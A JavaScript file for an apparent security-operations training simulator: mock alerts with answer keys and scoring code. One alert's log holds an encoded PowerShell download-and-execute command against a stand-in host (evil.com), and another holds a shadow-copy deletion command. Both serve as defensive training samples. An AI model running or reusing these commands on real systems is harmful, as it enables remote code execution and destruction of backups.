// Complete Alert Dataset (Stages 1 through 6)
const alerts = [
  // Stage 2 & 3: Endpoint & Network
  {
    id: 'ALT-1001',
    title: 'Suspicious PowerShell Execution',
    type: 'endpoint',
    severity: 'high',
    timestamp: '2026-09-03 10:42:11 UTC',
    sourceIp: '192.168.1.105',
    username: 'j.doe',
    correctAction: 'escalate',
    logs: {
      EventID: 4688,
      ProcessName: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      CommandLine: "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
      ParentProcess: "C:\\Windows\\explorer.exe"
    },
    explanation: "High Risk: Encoded PowerShell command pulling down external payloads bypasses default system policy."
  },

  // Stage 4: Phishing Scenarios
  {
    id: 'ALT-2001',
    title: 'Phishing: Spoofed Executive Credential Harvest',
    type: 'phishing',
    severity: 'high',
    timestamp: '2026-09-03 11:05:22 UTC',
    sourceIp: '203.0.113.195',
    username: 'c.smith (CFO)',
    correctAction: 'escalate',
    logs: {
      EmailSubject: "URGENT: Verify Your Payroll Details Immediately",
      SenderHeader: "CEO Direct <ceo-notice@mail-payroll-update-sec.com>",
      ReturnPath: "bounce@attacker-server.ru",
      SPF_Check: "FAIL",
      DKIM_Check: "FAIL",
      EmbeddedURL: "https://login-microsoft-portal.auth-verify.xyz/login"
    },
    explanation: "High Risk: Spoofed executive address targeting credentials via external domain with failing SPF/DKIM checks."
  },

  // Stage 5: Malware Incidents
  {
    id: 'ALT-3001',
    title: 'Malware: Rapid File Encryption (Ransomware)',
    type: 'malware',
    severity: 'high',
    timestamp: '2026-09-03 11:30:15 UTC',
    sourceIp: '10.0.2.88',
    username: 'r.vance',
    correctAction: 'escalate',
    logs: {
      Process: "svchost_update.exe",
      Path: "C:\\Users\\r.vance\\AppData\\Local\\Temp\\svchost_update.exe",
      FileModificationsCount: 1420,
      ModifiedExtensions: [".locked", ".crypto"],
      ShadowCopyDeletionAttempt: "vssadmin.exe Delete Shadows /All /Quiet"
    },
    explanation: "High Risk: Ransomware pattern executing from a temp directory and rapidly encrypting user files. Requires immediate host isolation."
  },

  // Stage 6: Cloud Security Incidents
  {
    id: 'ALT-4001',
    title: 'Cloud: Leaked AWS IAM Access Key Usage',
    type: 'cloud',
    severity: 'high',
    timestamp: '2026-09-03 11:45:10 UTC',
    sourceIp: '198.51.100.42',
    username: 'aws_admin_key_AKIAIOSFODNN7',
    correctAction: 'escalate',
    logs: {
      EventSource: "cloudtrail.amazonaws.com",
      EventName: "CreateUser",
      UserAgent: "aws-cli/2.11.0 Python/3.11.2 Linux/5.15",
      AccessKeyId: "AKIAIOSFODNN7EXAMPLE",
      SourceLocation: "Frankfurt, DE (Unrecognized Location)",
      PolicyModified: "AdministratorAccess attached to new backdoor account"
    },
    explanation: "High Risk: A leaked AWS access key was used from an unusual international location to create a new admin user account. Revoke key immediately."
  },
  {
    id: 'ALT-4002',
    title: 'Cloud: S3 Storage Bucket Made Publicly Accessible',
    type: 'cloud',
    severity: 'medium',
    timestamp: '2026-09-03 11:50:30 UTC',
    sourceIp: '10.0.1.50',
    username: 'd.chen (DevOps)',
    correctAction: 'remediate',
    logs: {
      EventSource: "s3.amazonaws.com",
      EventName: "PutBucketAcl",
      BucketName: "company-customer-backups-prod",
      CannedACL: "public-read",
      BlockPublicAccessStatus: "DISABLED"
    },
    explanation: "Medium Risk: A sensitive production backup bucket was reconfigured to allow public reads. Re-enable Public Access Block and restore private ACLs."
  },
  {
    id: 'ALT-4003',
    title: 'Cloud: Entra ID Impossible Travel Anomaly',
    type: 'cloud',
    severity: 'high',
    timestamp: '2026-09-03 11:55:00 UTC',
    sourceIp: '185.220.101.9',
    username: 's.jenkins@company.com',
    correctAction: 'escalate',
    logs: {
      IdentityProvider: "Microsoft Entra ID",
      Login1: "11:40 UTC — New York, US (IP: 72.14.201.2)",
      Login2: "11:55 UTC — Bucharest, RO (IP: 185.220.101.9)",
      TimeDifference: "15 minutes",
      MFA_Status: "Prompted (Session Hijacked via AitM)"
    },
    explanation: "High Risk: Logins registered from two geographically distant countries within 15 minutes indicate adversary-in-the-middle session hijacking. Revoke tokens and enforce password reset."
  }
];

let selectedAlert = null;
let closedCount = 0;
let correctCount = 0;

function init() {
  renderAlertQueue();
}

function renderAlertQueue() {
  const listEl = document.getElementById('alert-list');
  listEl.innerHTML = '';

  alerts.forEach(alert => {
    const card = document.createElement('div');
    card.className = `alert-card ${alert.severity}`;
    card.onclick = () => selectAlert(alert, card);
    card.innerHTML = `
      <div class="alert-title">${alert.title}</div>
      <div class="alert-meta">${alert.id} | ${alert.type.toUpperCase()}</div>
    `;
    listEl.appendChild(card);
  });
}

function selectAlert(alert, cardEl) {
  selectedAlert = alert;
  
  document.querySelectorAll('.alert-card').forEach(c => c.classList.remove('active'));
  cardEl.classList.add('active');

  const detailEl = document.getElementById('alert-detail');
  detailEl.innerHTML = `
    <h3>${alert.title} (${alert.id})</h3>
    <p><strong>Timestamp:</strong> ${alert.timestamp}</p>
    <p><strong>Category:</strong> <code>${alert.type.toUpperCase()}</code></p>
    <p><strong>Target/User:</strong> <code>${alert.username}</code></p>
    <p><strong>Source IP:</strong> <code>${alert.sourceIp}</code></p>
    <h4>Raw Cloud Trail / Audit Logs</h4>
    <div class="log-box">${JSON.stringify(alert.logs, null, 2)}</div>
  `;

  const feedbackEl = document.getElementById('feedback');
  feedbackEl.style.display = 'none';
}

function makeDecision(action) {
  if (!selectedAlert) {
    alert("Select an alert from the queue first!");
    return;
  }

  const feedbackEl = document.getElementById('feedback');
  feedbackEl.style.display = 'block';

  closedCount++;
  if (action === selectedAlert.correctAction) {
    correctCount++;
    feedbackEl.className = 'feedback-box correct';
    feedbackEl.innerHTML = `<strong>Correct Decision!</strong><br>${selectedAlert.explanation}`;
  } else {
    feedbackEl.className = 'feedback-box incorrect';
    feedbackEl.innerHTML = `<strong>Incorrect Decision.</strong><br>${selectedAlert.explanation}`;
  }

  document.getElementById('closed-count').innerText = closedCount;
  const accuracy = Math.round((correctCount / closedCount) * 100);
  document.getElementById('accuracy').innerText = `${accuracy}%`;
}

window.onload = init;
